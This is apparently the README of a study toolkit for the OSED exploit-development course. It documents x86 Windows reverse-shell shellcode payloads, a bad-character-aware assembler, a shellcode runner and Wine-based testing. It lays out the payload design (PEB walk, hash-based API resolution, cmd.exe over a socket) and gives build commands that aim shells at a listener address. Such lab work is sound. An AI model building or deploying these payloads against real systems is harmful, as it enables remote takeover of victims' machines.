# Redshell

<img src="logo.png" width="100">

x86 Windows shellcode development environment for OSED (EXP-301).

## Contents

- `payloads/revshell_strcpy.asm` — null-safe reverse shell (strcpy/gets-compatible)
- `payloads/revshell_scanf.asm` — isspace-safe reverse shell (scanf/strtok-compatible, avoids `\x00\x09\x0a\x0b\x0c\x0d\x20`)
- `payloads/revshell_url.asm` — URL-safe reverse shell (avoids isspace + `#%&+/=?`)
- `assembler.py` — Keystone-based assembler with bad char checking and runtime substitution
- `runner.c` — minimal Windows shellcode runner (VirtualAlloc + CreateThread)
- `Makefile` — assemble → compile → Wine test loop

## Requirements

```bash
pip install -r requirements.txt

# For Wine-based testing (Debian/Ubuntu)
sudo dpkg --add-architecture i386
sudo apt-get update && sudo apt-get install wine32:i386
```

## Usage

```bash
# Assemble with LHOST/LPORT
python3 assembler.py payloads/revshell_strcpy.asm -i 192.168.45.227 -p 443

# Bad character check
python3 assembler.py payloads/revshell_strcpy.asm -i 192.168.45.227 -p 443 -b "\x00\x0a\x0d"

# Size limit check
python3 assembler.py payloads/revshell_strcpy.asm -i 192.168.45.227 -p 443 -m 400

# Via Makefile (BADCHARS and MAX_SIZE are optional)
make assemble LHOST=192.168.45.227 LPORT=443 BADCHARS="\x00\x0a\x0d" MAX_SIZE=400
```

Output is exploit-ready Python bytes, 16 bytes per line.

## Payloads

Staged-free reverse shell that:

1. Walks the PEB module list to resolve `kernel32.dll` without API calls
2. Uses ROR-13 hashing to resolve `TerminateProcess`, `LoadLibraryA`, `CreateProcessA`
3. Loads `ws2_32.dll` and resolves `WSAStartup`, `WSASocketA`, `WSAConnect`
4. Connects back to LHOST:LPORT
5. Spawns `cmd.exe` with stdin/stdout/stderr redirected to the socket
6. Calls `TerminateProcess` to cleanly exit the parent process

| File | Bad chars avoided | Size |
|------|-------------------|------|
| `revshell_strcpy.asm` | `\x00` | 357 bytes |
| `revshell_scanf.asm` | `\x00\x09\x0a\x0b\x0c\x0d\x20` (all C `isspace()`) | 390 bytes |
| `revshell_url.asm` | above + `\x23\x25\x26\x2b\x2f\x3d\x3f` (`#%&+/=?`) | 393 bytes |

## Testing

```bash
# Build and run — opens a listener on LPORT, executes under Wine, connects back
make test LHOST=127.0.0.1 LPORT=4444 PAYLOAD=payloads/revshell_strcpy.asm

# Build only (assembles shellcode.h and compiles runner.exe)
make LHOST=127.0.0.1 LPORT=4444

# Run without starting a listener
make run

# Clean build artifacts
make clean
```

Wine faithfully implements the Windows TEB/PEB/LDR structures and Winsock, so the PEB-walk and API resolution logic can be validated locally.

## assembler.py

| Flag | Description |
|------|-------------|
| `-i IP` | LHOST — substitutes `LHOST_DWORD` in the asm |
| `-p PORT` | LPORT — substitutes `LPORT_WORD` in the asm |
| `-b CHARS` | Bad character list in msfvenom format. `\x00` always checked. |
| `-m BYTES` | Warn if shellcode exceeds this size |
| `--debug` | Prepend `INT3` (0xcc) for WinDbg breakpoint on entry |
| `--cheader FILE` | Write shellcode as a C `unsigned char` array to FILE (used by `runner.c`) |

Function name hashes are computed automatically at assemble time — use
`HASH_FuncName` anywhere in the asm and it will be replaced with the
correct ROR-13 hash.
